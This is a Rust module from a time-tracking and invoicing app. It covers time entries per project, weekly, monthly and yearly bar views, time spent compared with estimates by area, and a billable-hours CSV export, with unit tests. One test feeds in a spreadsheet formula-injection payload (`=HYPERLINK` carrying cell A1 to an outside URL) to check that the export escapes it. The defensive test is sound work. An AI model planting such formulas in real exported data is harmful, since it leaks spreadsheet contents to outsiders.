// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright © 2026 Aurélien Pierre

//! Time spent, as the Time page and a project's page show it: a bar per day
//! (per month over a year), the hours of each project, and for work done for
//! someone, what is left to bill. A session counts for its own project when
//! it names one, else for its task's project for a client, else its task's
//! first project.

use crate::projects::Project;
use crate::i18n::Translator;
use crate::money::Money;
use crate::tasks::Task;
use crate::timelog::Session;
use jiff::Span;
use jiff::civil::Date;
use jiff::tz::TimeZone;
use serde::Serialize;

/// One stretch of time, its project and task found.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Entry {
    pub key: String,
    pub start: i64,
    pub day: Date,
    pub minutes: u32,
    /// The project's id; "" when it counts for none.
    pub project: String,
    pub task: String,
    /// The task's title, else the note, else the project's title.
    pub title: String,
    pub note: String,
    /// Work for someone, not marked as given.
    pub billable: bool,
    pub invoice: String,
}

/// Each session with its project and title.
pub fn entries(sessions: &[Session], tasks: &[Task], projects: &[Project], zone: &TimeZone) -> Vec<Entry> {
    sessions
        .iter()
        .map(|s| {
            let task = tasks.iter().find(|t| !s.task.is_empty() && t.uid == s.task);
            // The task's project for a client first, else its first project.
            let from_task = task.and_then(|t| t.projects.iter().find(|c| projects.iter().any(|x| x.id == **c && x.is_for_client())).or(t.projects.first())).cloned();
            let project = if s.project.is_empty() { from_task.unwrap_or_default() } else { s.project.clone() };
            let found = projects.iter().find(|c| c.id == project);
            let title = match task {
                Some(t) => t.title.clone(),
                None if !s.note.is_empty() => s.note.clone(),
                None => found.map(|c| c.title.clone()).unwrap_or_default(),
            };
            Entry {
                key: s.key(),
                start: s.start,
                day: jiff::Timestamp::from_second(s.start).map(|t| t.to_zoned(zone.clone()).date()).unwrap_or(Date::ZERO),
                minutes: s.minutes,
                // The task's own word first, else its project's: work for a client is billed.
                billable: task.and_then(|t| t.billable).unwrap_or_else(|| found.is_some_and(Project::is_for_client)) && !s.unbilled,
                project,
                task: s.task.clone(),
                title,
                note: s.note.clone(),
                invoice: s.invoice.clone(),
            }
        })
        .collect()
}

/// What each stretch of time is for, as the Time page's filter reads it
/// (docs/areas.md, "A page's filter by area"), made once per reading of the
/// page: each project's area once (`Project::area_shown`, which reads its
/// open tasks), each task's once (`TaskAreas::of`), then a look-up a
/// stretch, so that a year of stretches costs no more than its projects.
pub struct StretchAreas {
    projects: std::collections::BTreeMap<String, Option<crate::areas::Area>>,
    tasks: std::collections::BTreeMap<String, crate::areas::Area>,
}

impl StretchAreas {
    pub fn of(projects: &[Project], tasks: &[Task], areas: &crate::areas::TaskAreas) -> StretchAreas {
        StretchAreas { projects: projects.iter().map(|p| (p.id.clone(), p.area_shown(tasks, areas))).collect(), tasks: tasks.iter().map(|t| (t.uid.clone(), areas.of(t))).collect() }
    }

    /// A stretch's area: its project's, as the Projects page shows it; with
    /// no project, its task's; none for time noted on nothing, on a project
    /// gone, or on one that shows whatever the ticks, which every tick shows.
    pub fn area_of(&self, entry: &Entry) -> Option<crate::areas::Area> {
        if !entry.project.is_empty() {
            return self.projects.get(&entry.project).copied().flatten();
        }
        if entry.task.is_empty() { None } else { self.tasks.get(&entry.task).copied() }
    }
}

/// One area's line of the Time page's comparison: the tasks done in the
/// period, the time spent on them beside what was first estimated
/// (`estimates_by_area`).
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct AreaEstimate {
    /// "work", "admin", "leisure".
    pub area: &'static str,
    pub spent_minutes: u32,
    pub estimated_minutes: u32,
    /// In words: "3 h 20", "2 h 30".
    pub spent: String,
    pub estimated: String,
}

/// Where estimates are off, by area: for each task done from `from` to `to`
/// (none a step of a bigger one, as the plan's ratio reads them,
/// `capacity::finished`) that `counts` and that has an estimate and time
/// spent, all its stretches summed beside its first estimate (else its
/// current one), each under the first of the areas it leans to (`area_of`,
/// `TaskAreas::leaning` in the window: work, then your admin, then leisure),
/// so that each task counts once. An area with no such task has no line.
pub fn estimates_by_area(entries: &[Entry], tasks: &[Task], area_of: &dyn Fn(&Task) -> crate::areas::Area, counts: &dyn Fn(&Task) -> bool, from: Date, to: Date, zone: &TimeZone) -> Vec<AreaEstimate> {
    let mut spent: std::collections::BTreeMap<&str, u32> = std::collections::BTreeMap::new();
    for e in entries.iter().filter(|e| !e.task.is_empty()) {
        *spent.entry(e.task.as_str()).or_insert(0) += e.minutes;
    }
    let mut sums = [(0u32, 0u32); 3];
    let mut seen: std::collections::BTreeSet<&str> = std::collections::BTreeSet::new();
    for task in tasks.iter().filter(|t| t.status == crate::tasks::Status::Completed && t.parent().is_none() && counts(t) && seen.insert(t.uid.as_str())) {
        let Some(done) = task.completed.and_then(|at| jiff::Timestamp::from_second(at).ok()).map(|t| t.to_zoned(zone.clone()).date()) else { continue };
        let estimate = task.estimate_first.unwrap_or(task.estimate);
        let minutes = spent.get(task.uid.as_str()).copied().unwrap_or(0);
        if done < from || done > to || estimate == 0 || minutes == 0 {
            continue;
        }
        let area = area_of(task);
        let slot = if area.work { 0 } else if area.admin { 1 } else { 2 };
        sums[slot].0 += minutes;
        sums[slot].1 += estimate;
    }
    ["work", "admin", "leisure"].into_iter().zip(sums).filter(|(_, (spent, _))| *spent > 0).map(|(area, (spent, estimated))| AreaEstimate { area, spent_minutes: spent, estimated_minutes: estimated, spent: duration(spent), estimated: duration(estimated) }).collect()
}

/// What `minutes` at `rate` an hour come to, to the cent.
pub fn amount(minutes: u32, rate: f64) -> Money {
    Money((f64::from(minutes) * rate * 100.0 / 60.0).round() as i64)
}

/// "45 min", "2 h", "2 h 30".
pub fn duration(minutes: u32) -> String {
    match (minutes / 60, minutes % 60) {
        (0, m) => format!("{m} min"),
        (h, 0) => format!("{h} h"),
        (h, m) => format!("{h} h {m:02}"),
    }
}

/// One project's time.
#[derive(Debug, Clone, Serialize)]
pub struct ProjectTime {
    pub id: String,
    pub title: String,
    /// Its place among the colours of the bars.
    pub index: usize,
    /// Its minutes in the period that the filter shows.
    pub minutes: u32,
    /// Those minutes in words; "45 min of 2 h" when the filter folds part of
    /// them (time with no project, each stretch by its task's area).
    pub time: String,
    pub billable: bool,
    /// Billable time not on an invoice yet, whenever it was spent.
    pub unbilled_minutes: u32,
    pub unbilled: String,
    pub unbilled_amount: String,
    pub rate: f64,
}

/// One bar: a day, or a month over a year.
#[derive(Debug, Clone, Serialize)]
pub struct Bar {
    pub label: String,
    pub date: String,
    pub minutes: u32,
    /// Minutes by project, in the order of `projects`.
    pub parts: Vec<u32>,
    pub today: bool,
}

/// One stretch of time, as listed.
#[derive(Debug, Clone, Serialize)]
pub struct EntryView {
    pub key: String,
    pub date: String,
    pub time: String,
    pub title: String,
    pub project: String,
    pub project_title: String,
    pub note: String,
    pub billable: bool,
    pub invoice: String,
    /// Noted by hand: it can be taken out. Every stretch not billed can be changed.
    pub by_hand: bool,
    /// As the form takes it: "2026-10-03", from "14:30" to "15:15", minutes.
    pub day: String,
    pub at: String,
    pub until: String,
    pub minutes: u32,
    /// The task it was given to (its UID); "" for a project alone.
    pub task: String,
    /// How its minutes were known: "measured", "typed", "corrected", "unknown"
    /// (`timelog::Kind`), and that in a word, said quietly; set by the caller.
    pub kind: String,
    pub kind_said: String,
}

/// The Time page, for a week, a month or a year.
#[derive(Debug, Clone, Serialize)]
pub struct TimeView {
    /// "Week of 28 September", "October 2026", "2026".
    pub title: String,
    pub period: String,
    /// The first day shown, to move from.
    pub from: String,
    /// What the filter shows of the period, in words ("31 h").
    pub total: String,
    /// The line under the title: "31 h in all"; when the filter folds some
    /// of the period, "12 h shown, 31 h in all".
    pub total_line: String,
    pub projects: Vec<ProjectTime>,
    pub bars: Vec<Bar>,
    pub most: u32,
    pub entries: Vec<EntryView>,
    /// "Nothing noted this week.", when so; "Nothing noted for what is
    /// ticked; 31 h in all.", when the filter folds all of it.
    pub sentence: String,
}

/// A cell of a spreadsheet: text, never a formula. One starting with "=",
/// "+", "-", "@", a tab or a return (a task made from someone's mail,
/// `=HYPERLINK(…)`, a client's name) would run in the spreadsheet; a quote
/// before it keeps it text. Quoted when it holds the separator, a quote or a
/// line's end.
pub fn csv_cell(text: &str, sep: char) -> String {
    let text = if text.starts_with(['=', '+', '-', '@', '\t', '\r']) { format!("'{text}") } else { text.to_string() };
    if text.contains([sep, '"', '\n', '\r']) { format!("\"{}\"", text.replace('"', "\"\"")) } else { text }
}

/// A project's billable time from `from` to `to` (both included), as a
/// spreadsheet reads it: what was done, how many hours, at what rate, for how
/// much, one line per task (or note), then the total. Nothing else: a full
/// invoice is the invoice's (invoice.rs). In French, `;` between fields and a
/// decimal comma, as French spreadsheets expect; else `,` and a point.
pub fn billable_csv(all: &[Entry], project: &Project, from: Date, to: Date, default_rate: f64, french: bool, words: [&str; 5]) -> String {
    let (sep, decimal) = if french { (';', ',') } else { (',', '.') };
    let number = |value: f64| format!("{value:.2}").replace('.', &decimal.to_string());
    let field = |text: &str| csv_cell(text, sep);
    let rate = project.rate.unwrap_or(default_rate);
    let mut by_what: Vec<(String, u32)> = Vec::new();
    for e in all.iter().filter(|e| e.project == project.id && e.billable && e.day >= from && e.day <= to) {
        let what = if e.title.trim().is_empty() { project.title.clone() } else { e.title.trim().to_string() };
        match by_what.iter_mut().find(|(w, _)| *w == what) {
            Some((_, minutes)) => *minutes += e.minutes,
            None => by_what.push((what, e.minutes)),
        }
    }
    let [what, hours, per_hour, amount_word, total] = words;
    let mut out = [what, hours, per_hour, amount_word].map(field).join(&sep.to_string()) + "\r\n";
    let mut minutes_total = 0;
    for (what, minutes) in &by_what {
        minutes_total += minutes;
        let money = amount(*minutes, rate);
        out.push_str(&[field(what), number(f64::from(*minutes) / 60.0), number(rate), number(money.cents() as f64 / 100.0)].join(&sep.to_string()));
        out.push_str("\r\n");
    }
    let money = amount(minutes_total, rate);
    out.push_str(&[field(total), number(f64::from(minutes_total) / 60.0), String::new(), number(money.cents() as f64 / 100.0)].join(&sep.to_string()));
    out.push_str("\r\n");
    out
}

/// The first and last day of `period` ("week", "month", "year") around `anchor`.
pub fn bounds(period: &str, anchor: Date) -> (Date, Date) {
    match period {
        "year" => (anchor.first_of_year(), anchor.last_of_year()),
        "month" => (anchor.first_of_month(), anchor.last_of_month()),
        _ => {
            let monday = anchor.checked_sub(Span::new().days(i64::from(anchor.weekday().to_monday_zero_offset()))).unwrap_or(anchor);
            (monday, monday.checked_add(Span::new().days(6)).unwrap_or(monday))
        }
    }
}

/// What the Time page shows for `period` around `anchor`, every project or
/// one, of the stretches `shows` keeps (the page's filter by area,
/// docs/areas.md): the bars, the hours and the list follow it, and the lines
/// say when it folds some of the period; what is left to bill is always
/// whole, as invoices count it.
#[allow(clippy::too_many_arguments)]
pub fn view(all: &[Entry], projects: &[Project], sessions_by_hand: &dyn Fn(&str) -> bool, period: &str, anchor: Date, project: Option<&str>, default_rate: f64, today: Date, tr: &Translator, shows: &dyn Fn(&Entry) -> bool) -> TimeView {
    let (from, to) = bounds(period, anchor);
    let wanted = |e: &&Entry| project.is_none_or(|p| e.project == p);
    let period_of: Vec<&Entry> = all.iter().filter(wanted).filter(|e| e.day >= from && e.day <= to).collect();
    let shown: Vec<&Entry> = period_of.iter().copied().filter(|e| shows(e)).collect();
    // Projects with time in the period, the most first; then those with time left to bill.
    let mut ids: Vec<String> = Vec::new();
    for e in &shown {
        if !ids.contains(&e.project) {
            ids.push(e.project.clone());
        }
    }
    let minutes_of = |id: &str| shown.iter().filter(|e| e.project == id).map(|e| e.minutes).sum::<u32>();
    ids.sort_by_key(|id| std::cmp::Reverse(minutes_of(id)));
    for e in all.iter().filter(wanted).filter(|e| e.billable && e.invoice.is_empty() && shows(e)) {
        if !ids.contains(&e.project) {
            ids.push(e.project.clone());
        }
    }
    let times: Vec<ProjectTime> = ids
        .iter()
        .enumerate()
        .map(|(index, id)| {
            let found = projects.iter().find(|c| c.id == *id);
            let rate = found.and_then(|c| c.rate).unwrap_or(default_rate);
            let unbilled_minutes: u32 = all.iter().filter(|e| e.project == *id && e.billable && e.invoice.is_empty()).map(|e| e.minutes).sum();
            let minutes = minutes_of(id);
            let whole: u32 = period_of.iter().filter(|e| e.project == *id).map(|e| e.minutes).sum();
            let mut args = crate::i18n::args();
            args.set("shown", duration(minutes));
            args.set("all", duration(whole));
            ProjectTime {
                id: id.clone(),
                title: found.map_or_else(|| tr.text(if id.is_empty() { "time-no-project" } else { "time-gone-project" }, None), |c| c.title.clone()),
                index,
                minutes,
                time: if whole > minutes { tr.text("time-part", Some(&args)) } else { duration(minutes) },
                billable: found.is_some_and(Project::is_for_client),
                unbilled_minutes,
                unbilled: if unbilled_minutes > 0 { duration(unbilled_minutes) } else { String::new() },
                // Line by line, as the invoice made of it rounds them (the review of phase 3, F18).
                unbilled_amount: match found {
                    Some(project) if unbilled_minutes > 0 && rate > 0.0 => tr.money(Money(crate::invoice::life::time_amount(&all, project, (rate * 100.0).round() as i64))),
                    None if unbilled_minutes > 0 && rate > 0.0 => tr.money(amount(unbilled_minutes, rate)),
                    _ => String::new(),
                },
                rate,
            }
        })
        .collect();
    let part_of = |entries: &[&&Entry]| -> Vec<u32> { ids.iter().map(|id| entries.iter().filter(|e| e.project == *id).map(|e| e.minutes).sum()).collect() };
    let bars: Vec<Bar> = if period == "year" {
        (1..=12)
            .filter_map(|m| Date::new(from.year(), m, 1).ok())
            .map(|first| {
                let here: Vec<&&Entry> = shown.iter().filter(|e| e.day.year() == first.year() && e.day.month() == first.month()).collect();
                Bar {
                    // The language's own short names: three letters gave French June and July both "jui".
                    label: tr.month_short(first),
                    date: first.to_string(),
                    minutes: here.iter().map(|e| e.minutes).sum(),
                    parts: part_of(&here),
                    today: today.year() == first.year() && today.month() == first.month(),
                }
            })
            .collect()
    } else {
        let mut days = Vec::new();
        let mut day = from;
        while day <= to {
            let here: Vec<&&Entry> = shown.iter().filter(|e| e.day == day).collect();
            days.push(Bar {
                label: if period == "week" { tr.weekday_short(day) } else { day.day().to_string() },
                date: day.to_string(),
                minutes: here.iter().map(|e| e.minutes).sum(),
                parts: part_of(&here),
                today: day == today,
            });
            day = match day.tomorrow() {
                Ok(next) => next,
                Err(_) => break,
            };
        }
        days
    };
    let total: u32 = shown.iter().map(|e| e.minutes).sum();
    let whole: u32 = period_of.iter().map(|e| e.minutes).sum();
    let mut totals = crate::i18n::args();
    totals.set("shown", duration(total));
    totals.set("all", duration(whole));
    totals.set("time", duration(total));
    let mut listed: Vec<&&Entry> = shown.iter().collect();
    listed.sort_by_key(|e| std::cmp::Reverse(e.start));
    let title = match period {
        "year" => from.year().to_string(),
        "month" => tr.month_year(from),
        _ => {
            let mut args = crate::i18n::args();
            args.set("day", tr.day_month(from));
            tr.text("time-week-of", Some(&args))
        }
    };
    TimeView {
        title,
        period: period.to_string(),
        from: from.to_string(),
        total: duration(total),
        total_line: if whole > total { tr.text("time-total-shown", Some(&totals)) } else { tr.text("time-total", Some(&totals)) },
        most: bars.iter().map(|b| b.minutes).max().unwrap_or(0),
        bars,
        entries: listed
            .into_iter()
            .map(|e| EntryView {
                key: e.key.clone(),
                date: tr.day(e.day),
                time: duration(e.minutes),
                title: e.title.clone(),
                project: e.project.clone(),
                project_title: times.iter().find(|p| p.id == e.project).map(|p| p.title.clone()).unwrap_or_default(),
                note: if e.note == e.title { String::new() } else { e.note.clone() },
                billable: e.billable,
                invoice: e.invoice.clone(),
                by_hand: sessions_by_hand(&e.key),
                day: e.day.to_string(),
                at: jiff::Timestamp::from_second(e.start).map(|t| t.to_zoned(crate::zone::current()).strftime("%H:%M").to_string()).unwrap_or_default(),
                until: jiff::Timestamp::from_second(e.start + i64::from(e.minutes) * 60).map(|t| t.to_zoned(crate::zone::current()).strftime("%H:%M").to_string()).unwrap_or_default(),
                minutes: e.minutes,
                task: e.task.clone(),
                kind: String::new(),
                kind_said: String::new(),
            })
            .collect(),
        sentence: match (total, whole) {
            (0, 0) => tr.text(&format!("time-nothing-{period}"), None),
            (0, _) => tr.text("time-nothing-ticked", Some(&totals)),
            _ => String::new(),
        },
        projects: times,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Time for every area (the owner's word, 18 November 2026): time
    /// noted on an admin task with no project and on a leisure task in a
    /// project of its own is kept, shown and summed as work's is; the
    /// filter folds it by area and counts it in the whole; the comparison by
    /// area puts each task done in the period under its area, time spent
    /// beside its first estimate.
    #[test]
    fn time_on_admin_and_leisure_tasks_is_kept_shown_and_summed() {
        use crate::areas::{Area, TaskAreas};
        let zone = TimeZone::UTC;
        let at = |d: &str, h: i8| Date::from(d.parse::<Date>().unwrap()).at(h, 0, 0, 0).to_zoned(zone.clone()).unwrap().timestamp().as_second();
        let task = |uid: &str, categories: &[&str], projects: &[&str], estimate: u32| Task { uid: uid.into(), title: uid.into(), categories: categories.iter().map(|c| c.to_string()).collect(), projects: projects.iter().map(|p| p.to_string()).collect(), estimate, estimate_first: Some(estimate), status: crate::tasks::Status::Completed, completed: Some(at("2026-10-07", 18)), ..Task::default() };
        let tasks = vec![task("report", &["travail"], &["lumen"], 60), task("taxes", &[], &[], 30), task("choir", &["loisirs"], &["garden"], 45)];
        let projects = vec![Project { id: "lumen".into(), title: "Lumen".into(), client: Some("Lumen".into()), kind: Some("project".into()), ..Project::default() }, Project { id: "garden".into(), title: "Garden".into(), ..Project::default() }];
        let sessions = vec![
            Session { task: "report".into(), start: at("2026-10-05", 9), minutes: 90, ..Session::default() },
            Session { task: "taxes".into(), start: at("2026-10-06", 20), minutes: 50, ..Session::default() },
            Session { task: "choir".into(), start: at("2026-10-07", 21), minutes: 40, ..Session::default() },
        ];
        let all = entries(&sessions, &tasks, &projects, &zone);
        assert_eq!(all.iter().map(|e| e.project.as_str()).collect::<Vec<_>>(), ["lumen", "", "garden"], "with or without a project");
        let tr = Translator::new("en");
        let today: Date = "2026-10-07".parse().unwrap();
        let week = view(&all, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &|_| true);
        assert_eq!(week.total, "3 h", "every area summed");
        assert_eq!(week.entries.len(), 3);
        let lines: Vec<(&str, u32)> = week.projects.iter().map(|p| (p.id.as_str(), p.minutes)).collect();
        assert_eq!(lines, [("lumen", 90), ("", 50), ("garden", 40)]);
        // By area: in the evening, leisure's shown, the rest in the whole.
        let areas = TaskAreas { work_categories: vec!["travail".into()], leisure_categories: vec!["loisirs".into()], ..TaskAreas::usual() };
        let stretches = StretchAreas::of(&projects, &tasks, &areas);
        let leisure = view(&all, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &|e: &Entry| stretches.area_of(e).is_none_or(|a| a.meets(Area::LEISURE)));
        assert_eq!(leisure.total_line, "40 min shown, 3 h in all");
        // Where estimates are off, by area: each done task's time beside its first estimate.
        let (from, to) = bounds("week", today);
        let by_area = estimates_by_area(&all, &tasks, &|t| areas.of(t), &|_| true, from, to, &zone);
        let got: Vec<(&str, u32, u32)> = by_area.iter().map(|a| (a.area, a.spent_minutes, a.estimated_minutes)).collect();
        assert_eq!(got, [("work", 90, 60), ("admin", 50, 30), ("leisure", 40, 45)]);
        assert_eq!((by_area[0].spent.as_str(), by_area[0].estimated.as_str()), ("1 h 30", "1 h"));
        // A task done outside the period, or not counted (another project chosen), has no line.
        let only_lumen = estimates_by_area(&all, &tasks, &|t| areas.of(t), &|t| t.projects.contains(&"lumen".to_string()), from, to, &zone);
        assert_eq!(only_lumen.iter().map(|a| a.area).collect::<Vec<_>>(), ["work"]);
        let next_week = bounds("week", "2026-10-14".parse().unwrap());
        assert!(estimates_by_area(&all, &tasks, &|t| areas.of(t), &|_| true, next_week.0, next_week.1, &zone).is_empty());
    }

    /// The Time page's filter asks each project's area once per reading,
    /// never once per stretch (the review of the branch `views`, V6: a year of
    /// 2,500 stretches on a project with neither a word nor a client took a
    /// second on the window's thread): two projects, 3,000 tasks, 2,500
    /// stretches, two asks.
    #[test]
    fn each_project_s_area_is_asked_once_per_reading() {
        use crate::areas::{Area, TaskAreas};
        let projects = [Project { id: "own".into(), title: "Own".into(), ..Project::default() }, Project { id: "lumen".into(), title: "Lumen".into(), client: Some("Lumen".into()), ..Project::default() }];
        let tasks: Vec<Task> = (0..3000u32).map(|k| Task { uid: format!("t{k}"), projects: vec![if k % 3 == 0 { "own".to_string() } else { "lumen".to_string() }], categories: vec![if k % 2 == 0 { "Famille".to_string() } else { "courses".to_string() }], status: if k % 10 == 0 { crate::tasks::Status::NeedsAction } else { crate::tasks::Status::Completed }, ..Task::default() }).collect();
        let entries: Vec<Entry> = (0..2500u32).map(|k| Entry { key: format!("e{k}"), start: i64::from(k) * 3600, day: Date::ZERO, minutes: 30, project: if k % 2 == 0 { "own".into() } else { "lumen".into() }, task: String::new(), title: String::new(), note: String::new(), billable: false, invoice: String::new() }).collect();
        crate::projects::AREA_SHOWN_ASKED.with(|n| n.set(0));
        let stretches = StretchAreas::of(&projects, &tasks, &TaskAreas::usual());
        let shown = entries.iter().filter(|e| stretches.area_of(e).is_none_or(|a| a.meets(Area::LEISURE))).count();
        assert_eq!(crate::projects::AREA_SHOWN_ASKED.with(std::cell::Cell::get), 2, "once a project");
        assert_eq!(shown, 1250, "the unsaid project's open tasks are leisure's: its stretches show; the client's do not");
    }

    /// What a stretch of time is for, as the Time page's filter reads it: its
    /// project's area (an unsaid one work's); with no project, its task's;
    /// none for time on nothing, or on a project gone.
    #[test]
    fn a_stretch_of_time_is_for_its_project_s_area() {
        use crate::areas::{Area, TaskAreas};
        let entry = |project: &str, task: &str| Entry { key: String::new(), start: 0, day: Date::ZERO, minutes: 30, project: project.into(), task: task.into(), title: String::new(), note: String::new(), billable: false, invoice: String::new() };
        let projects = [Project { id: "garden".into(), area: Some("leisure".into()), ..Project::default() }, Project { id: "lumen".into(), client: Some("Studio Lumen".into()), ..Project::default() }];
        let tasks = [Task { uid: "report".into(), categories: vec!["Travail".into()], ..Task::default() }, Task { uid: "forms".into(), ..Task::default() }];
        let areas = TaskAreas { work_categories: vec!["travail".into()], ..TaskAreas::usual() };
        let stretches = StretchAreas::of(&projects, &tasks, &areas);
        let of = |e: Entry| stretches.area_of(&e);
        assert_eq!(of(entry("garden", "report")), Some(Area::LEISURE), "its project's, before its task's");
        assert_eq!(of(entry("lumen", "")), Some(Area::WORK));
        assert_eq!(of(entry("", "report")), Some(Area::WORK), "no project: its task's");
        assert_eq!(of(entry("", "forms")), Some(Area::ADMIN));
        assert_eq!((of(entry("", "")), of(entry("gone", "report"))), (None, None), "on nothing, or a project gone: always shown");
    }

    #[test]
    fn billable_time_as_a_spreadsheet() {
        let day = |d: &str| d.parse::<Date>().unwrap();
        let entry = |title: &str, d: &str, minutes: u32, billable: bool| Entry { key: String::new(), start: 0, day: day(d), minutes, project: "studio".into(), task: String::new(), title: title.into(), note: String::new(), billable, invoice: String::new() };
        let all = vec![entry("Logo; second draft", "2026-10-01", 90, true), entry("Logo; second draft", "2026-10-02", 30, true), entry("Call", "2026-10-02", 60, false), entry("Site", "2026-11-01", 60, true)];
        let studio = Project { id: "studio".into(), title: "Studio".into(), rate: Some(60.0), ..Project::default() };
        let csv = billable_csv(&all, &studio, day("2026-10-01"), day("2026-10-31"), 50.0, true, ["Quoi", "Heures", "Taux horaire", "Montant", "Total"]);
        assert_eq!(csv, "Quoi;Heures;Taux horaire;Montant\r\n\"Logo; second draft\";2,00;60,00;120,00\r\nTotal;2,00;;120,00\r\n");
        let english = billable_csv(&all, &studio, day("2026-01-01"), day("2026-12-31"), 50.0, false, ["What", "Hours", "Hourly rate", "Amount", "Total"]);
        assert!(english.ends_with("Total,3.00,,180.00\r\n"), "{english}");
        // A title that a spreadsheet would run as a formula stays text.
        let formula = vec![entry("=HYPERLINK(\"https://example.org/?\"&A1)", "2026-10-01", 60, true)];
        let csv = billable_csv(&formula, &studio, day("2026-10-01"), day("2026-10-31"), 50.0, false, ["What", "Hours", "Hourly rate", "Amount", "Total"]);
        assert!(csv.contains("\r\n\"'=HYPERLINK(\"\"https://example.org/?\"\"&A1)\",1.00,60.00,60.00\r\n"), "{csv}");
    }

    fn project(id: &str, for_client: bool, rate: Option<f64>) -> Project {
        Project { id: id.into(), title: id.to_uppercase(), kind: for_client.then(|| "project".to_string()), rate, ..Project::default() }
    }

    #[test]
    fn time_by_project_and_left_to_bill() {
        let zone = TimeZone::UTC;
        let day = |d: &str, h: i8| Date::from(d.parse::<Date>().unwrap()).at(h, 0, 0, 0).to_zoned(zone.clone()).unwrap().timestamp().as_second();
        let site = Task { uid: "t".into(), title: "Build the site".into(), projects: vec!["housing".into(), "lumen".into()], ..Task::default() };
        let sessions = vec![
            Session { task: "t".into(), start: day("2026-10-05", 9), minutes: 90, ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-10-06", 14), minutes: 30, note: "Call with the client".into(), ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-10-06", 16), minutes: 60, invoice: "2026-001".into(), ..Session::default() },
            Session { project: "housing".into(), start: day("2026-10-07", 10), minutes: 45, ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-09-20", 10), minutes: 15, unbilled: true, ..Session::default() },
        ];
        let projects = vec![project("housing", false, None), project("lumen", true, Some(60.0))];
        let all = entries(&sessions, &[site], &projects, &zone);
        // The task counts for its project for a client, not its first project.
        assert_eq!(all[0].project, "lumen");
        assert!(all[0].billable && !all[3].billable && !all[4].billable);
        let tr = Translator::new("en");
        let today: Date = "2026-10-07".parse().unwrap();
        let week = view(&all, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &|_| true);
        assert_eq!(week.total, "3 h 45");
        assert_eq!(week.bars.len(), 7);
        assert_eq!((week.bars[0].minutes, week.bars[1].minutes, week.bars[2].minutes), (90, 90, 45));
        let lumen = &week.projects[0];
        assert_eq!((lumen.id.as_str(), lumen.minutes, lumen.unbilled_minutes), ("lumen", 180, 120));
        assert_eq!(lumen.unbilled_amount, tr.money(Money(12000)));
        assert_eq!(week.entries[0].title, "HOUSING", "newest first, titled by its project");
        let year = view(&all, &projects, &|_| false, "year", today, Some("lumen"), 40.0, today, &tr, &|_| true);
        assert_eq!((year.bars.len(), year.bars[8].minutes, year.bars[9].minutes), (12, 15, 180));
        assert_eq!(amount(50, 60.0), Money(5000));
        assert_eq!((duration(45).as_str(), duration(120).as_str(), duration(150).as_str()), ("45 min", "2 h", "2 h 30"));
        assert_eq!(week.total_line, "3 h 45 in all");
        // The filter folds Lumen's time (its project's area not ticked): the lines say the whole
        // beside what shows; what is left to bill is never folded.
        let housing_only = |e: &Entry| e.project == "housing";
        let folded = view(&all, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &housing_only);
        assert_eq!((folded.total.as_str(), folded.total_line.as_str(), folded.sentence.as_str()), ("45 min", "45 min shown, 3 h 45 in all", ""));
        assert!(folded.projects.iter().all(|p| p.id == "housing") && folded.entries.iter().all(|e| e.project == "housing"), "Lumen folds");
        let nothing = view(&all, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &|_| false);
        assert_eq!((nothing.total.as_str(), nothing.sentence.as_str()), ("0 min", "Nothing noted for what is ticked; 3 h 45 in all."));
        // What is left to bill, whole whatever the filter: the same as unfiltered for every line it shows.
        let whole = view(&all, &projects, &|_| false, "year", today, Some("lumen"), 40.0, today, &tr, &|_| true);
        let lumen_folded_around = view(&all, &projects, &|_| false, "year", today, None, 40.0, today, &tr, &|e: &Entry| e.project == "lumen" && e.day == today.yesterday().unwrap());
        let lumen_line = lumen_folded_around.projects.iter().find(|p| p.id == "lumen").unwrap();
        assert_eq!((lumen_line.unbilled_minutes, lumen_line.unbilled_amount.clone()), (whole.projects[0].unbilled_minutes, whole.projects[0].unbilled_amount.clone()));
        // Time with no project, its stretches folded one by one by their task's area: its line says it is partial.
        let mut mixed = all.clone();
        for (e, task) in mixed.iter_mut().zip(["work", "work", "home", "home", "home"]) {
            e.project = String::new();
            e.task = task.into();
        }
        let partial = view(&mixed, &projects, &|_| false, "week", today, None, 40.0, today, &tr, &|e: &Entry| e.task == "home");
        let none = partial.projects.iter().find(|p| p.id.is_empty()).unwrap();
        assert_eq!((none.minutes, none.time.as_str()), (105, "1 h 45 of 3 h 45"));
    }
}
